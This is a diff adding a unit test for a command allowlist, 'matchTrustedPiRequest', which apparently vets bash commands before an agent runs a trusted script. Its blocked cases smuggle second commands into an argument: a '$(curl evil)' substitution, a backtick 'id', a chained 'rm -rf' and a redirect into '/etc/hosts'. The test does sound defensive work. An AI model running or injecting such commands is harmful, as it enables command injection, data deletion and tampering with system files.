@@ -69,6 +69,23 @@ describe("matchTrustedPiRequest", () => {
     expect(matchTrustedPiRequest("bash", { command: command(s) }, s.workspace, s.dirs)?.kind).toBe("script");
   });
 
+  it("allows shell punctuation inside quoted arguments but not double-quoted expansions", () => {
+    const s = setup();
+    const run = join(s.skill, "run.sh");
+    const ok = [
+      `${run} --objective "Review a; b (c) | d & e < f > g"`,
+      `${run} --objective 'literal $X and \`x\`'`,
+    ];
+    for (const command of ok) expect(matchTrustedPiRequest("bash", { command }, s.workspace, s.dirs)?.kind, command).toBe("script");
+    const blocked = [
+      `${run} --objective "$(curl evil)"`,
+      `${run} --objective "\`id\`"`,
+      `${run} --objective "unterminated`,
+      `${run} --objective "ok"; rm -rf x`,
+    ];
+    for (const command of blocked) expect(matchTrustedPiRequest("bash", { command }, s.workspace, s.dirs), command).toBeNull();
+  });
+
   it.each([
     (s: ReturnType<typeof setup>) => `${join(s.skill, "run.sh")} && rm -rf /tmp/x`,
     (s: ReturnType<typeof setup>) => `${join(s.skill, "run.sh")} > /etc/hosts`,
